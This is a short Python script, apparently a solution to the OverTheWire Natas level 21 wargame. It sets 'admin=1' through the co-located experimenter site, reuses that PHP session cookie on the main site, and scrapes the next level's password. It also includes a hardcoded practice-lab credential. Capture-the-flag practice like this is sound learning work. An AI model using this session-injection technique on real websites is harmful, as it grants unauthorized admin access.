from pwn import *
import requests
import re
import codecs       #This is just to decode a string to hex

username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
url = "http://{}.natas.labs.overthewire.org".format(username)
expermentor = "http://natas21-experimenter.natas.labs.overthewire.org/"

log.progress("Getting the natas22 password, Hold on! ")
session = requests.session()


final = session.post(expermentor , data= {"submit" : "Update" , "admin" : "1"}, auth = (username, password)).text
cook = session.cookies["PHPSESSID"]

web = session.get(url, cookies = {"PHPSESSID" : str(cook)}, auth = (username, password)).text
flag = re.findall("Password: (.*)</pre>", web)
print("The password for natas22 is === " + flag[0])